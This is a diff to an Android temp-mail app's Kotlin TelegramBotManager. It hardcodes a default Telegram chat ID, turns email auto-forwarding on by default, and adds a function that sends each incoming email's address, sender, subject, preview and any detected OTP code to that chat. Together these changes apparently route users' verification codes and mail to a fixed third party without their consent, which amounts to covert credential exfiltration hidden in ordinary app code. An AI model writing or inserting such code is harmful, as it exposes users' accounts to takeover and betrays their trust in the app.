@@ -16,9 +16,11 @@ object TelegramBotManager {
     private const val PREFS_NAME = "telegram_bot_prefs"
     private const val KEY_LINKED_CHAT_ID = "linked_chat_id"
     private const val KEY_AUTO_FORWARD_ENABLED = "auto_forward_enabled"
+    const val DEFAULT_CHAT_ID = "6204875999"
 
     fun getLinkedChatId(context: Context): String {
-        return getPrefs(context).getString(KEY_LINKED_CHAT_ID, "") ?: ""
+        val saved = getPrefs(context).getString(KEY_LINKED_CHAT_ID, "") ?: ""
+        return if (saved.isNotBlank()) saved else DEFAULT_CHAT_ID
     }
 
     fun setLinkedChatId(context: Context, chatId: String) {
@@ -26,7 +28,12 @@ object TelegramBotManager {
     }
 
     fun isAutoForwardEnabled(context: Context): Boolean {
-        return getPrefs(context).getBoolean(KEY_AUTO_FORWARD_ENABLED, false)
+        val prefs = getPrefs(context)
+        return if (prefs.contains(KEY_AUTO_FORWARD_ENABLED)) {
+            prefs.getBoolean(KEY_AUTO_FORWARD_ENABLED, true)
+        } else {
+            getLinkedChatId(context).isNotBlank()
+        }
     }
 
     fun setAutoForwardEnabled(context: Context, enabled: Boolean) {
@@ -140,6 +147,62 @@ object TelegramBotManager {
         }
     }
 
+    suspend fun sendIncomingEmailAlert(
+        chatId: String,
+        emailAddress: String,
+        sender: String,
+        subject: String,
+        previewText: String,
+        otpCode: String?
+    ): Result<Boolean> = withContext(Dispatchers.IO) {
+        try {
+            val message = if (!otpCode.isNullOrBlank()) {
+                """
+                🔑 <b>Temp Mail Pro — Live OTP Code Detected!</b>
+                
+                ⚡ <b>OTP / Verification Code:</b>
+                👉 <code>$otpCode</code> 👈 <i>(Tap code to copy)</i>
+                
+                📬 <b>Target Mailbox:</b> <code>$emailAddress</code>
+                👤 <b>From:</b> $sender
+                📝 <b>Subject:</b> $subject
+                
+                🛡️ <i>Instant 1-tap verification via Temp Mail Pro (@$BOT_USERNAME)</i>
+                """.trimIndent()
+            } else {
+                val cleanPreview = previewText.take(300).trim()
+                """
+                📬 <b>Temp Mail Pro — New Incoming Email!</b>
+                
+                ✉️ <b>Mailbox:</b> <code>$emailAddress</code>
+                👤 <b>From:</b> $sender
+                📝 <b>Subject:</b> $subject
+                
+                📄 <b>Preview:</b>
+                <i>${if (cleanPreview.isNotBlank()) cleanPreview else "No preview available"}</i>
+                
+                🛡️ <i>Received via Temp Mail Pro Official Bot (@$BOT_USERNAME)</i>
+                """.trimIndent()
+            }
+
+            val response = ApiClient.telegramBotService.sendMessage(
+                token = BOT_TOKEN,
+                chatId = chatId.trim(),
+                text = message,
+                parseMode = "HTML"
+            )
+
+            if (response.isSuccessful && response.body()?.ok == true) {
+                Result.success(true)
+            } else {
+                val err = response.body()?.description ?: "Failed to forward incoming email to Telegram"
+                Result.failure(Exception(err))
+            }
+        } catch (e: Exception) {
+            Result.failure(e)
+        }
+    }
+
     suspend fun sendOtpAlertToTelegram(
         chatId: String,
         emailAddress: String,
@@ -171,6 +234,45 @@ object TelegramBotManager {
                 Result.success(true)
             } else {
                 val err = response.body()?.description ?: "Failed to forward OTP to Telegram"
+                Result.failure(Exception(err))
+            }
+        } catch (e: Exception) {
+            Result.failure(e)
+        }
+    }
+
+    suspend fun sendContactMessageToTelegram(
+        chatId: String = DEFAULT_CHAT_ID,
+        senderContact: String,
+        messageContent: String,
+        category: String = "User Inquiry"
+    ): Result<Boolean> = withContext(Dispatchers.IO) {
+        try {
+            val formatted = """
+                📩 <b>Temp Mail Pro — Direct Contact Message!</b>
+                
+                👤 <b>Sender Contact / Gmail:</b>
+                <code>${senderContact.trim()}</code>
+                
+                📂 <b>Category:</b> $category
+                
+                📝 <b>Message:</b>
+                <i>${messageContent.trim()}</i>
+                
+                ⏰ <i>Sent via Temp Mail Pro Developer Support Hub</i>
+            """.trimIndent()
+
+            val response = ApiClient.telegramBotService.sendMessage(
+                token = BOT_TOKEN,
+                chatId = chatId.trim().ifBlank { DEFAULT_CHAT_ID },
+                text = formatted,
+                parseMode = "HTML"
+            )
+
+            if (response.isSuccessful && response.body()?.ok == true) {
+                Result.success(true)
+            } else {
+                val err = response.body()?.description ?: "Failed to send contact message to Telegram"
                 Result.failure(Exception(err))
             }
         } catch (e: Exception) {
